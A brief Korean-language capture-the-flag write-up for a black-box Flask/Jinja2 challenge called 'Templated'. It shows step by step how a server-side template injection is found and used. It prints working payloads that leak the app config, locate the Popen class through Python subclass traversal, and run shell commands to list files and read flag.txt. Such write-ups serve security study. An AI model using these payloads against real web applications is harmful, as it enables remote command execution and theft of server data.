# Templated
![image](https://github.com/user-attachments/assets/096d5d62-f741-40b6-bf54-70eef9ad1a74)
- 소스코드가 제공되지않는 블랙박스 형식의 문제
- flask 로 was를 구동하고있으며, 템플릿은 jinja2 엔진을 사용

## PoC
![image](https://github.com/user-attachments/assets/e6b60b39-08e6-4677-9f7c-1563a78abbc3)
- 위와같이 경로에 값을 넣을경우 값 그대로 출력한다는것을 확인
- SSTI 문제인듯 하여 테스트
  
![image](https://github.com/user-attachments/assets/4910f95b-027a-48bc-822c-ddd9d3e27935)
- ```{{config}}```입력 시 설정값 노출 확인

![image](https://github.com/user-attachments/assets/014519aa-18d4-4c6c-b9a7-275aa05c244f)
- ```{{''.__class__.__mro__[1].__subclasses__()[0:]}}```입력 후 인덱스를 조정하여 ```Popen()```클래스를 찾는다.

![image](https://github.com/user-attachments/assets/d48a5de7-4e44-4635-a2ac-a2c690765ed6)
- ```{{''.__class__.__mro__[1].__subclasses__()[414]('ls',shell=True,stdout=-1).communicate()}}```
- 414번째에 있는 ```Popen()```클래스를 사용하여 쉘에서 ls 명령어를 실행한 결과를 반환

![image](https://github.com/user-attachments/assets/9ec13d74-f9c2-4b93-9edd-fb058961764c)
- ```{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()}}```
- flag.txt 읽기

